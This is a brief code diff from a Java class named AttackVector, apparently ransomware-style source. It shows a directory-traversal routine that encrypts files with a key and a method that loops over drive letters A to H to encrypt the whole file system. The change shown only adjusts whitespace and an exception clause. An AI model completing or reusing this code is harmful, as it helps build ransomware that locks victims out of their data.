@@ -16,8 +16,8 @@ public class AttackVector {
 		Traverse bfs = new BFS<File>();
 		bfs.traverseAndEncrypt(inputDir, dirs, key);
 	}
- 
-	public void encryptFileSystem(CryptoKey clientKey) throws Exception {
+
+	public void encryptFileSystem(CryptoKey clientKey) {
 
 		Collection<File> visitedFolders = Collections.emptySet();
 		for (char i = 'A'; i <= 'H'; i++) {
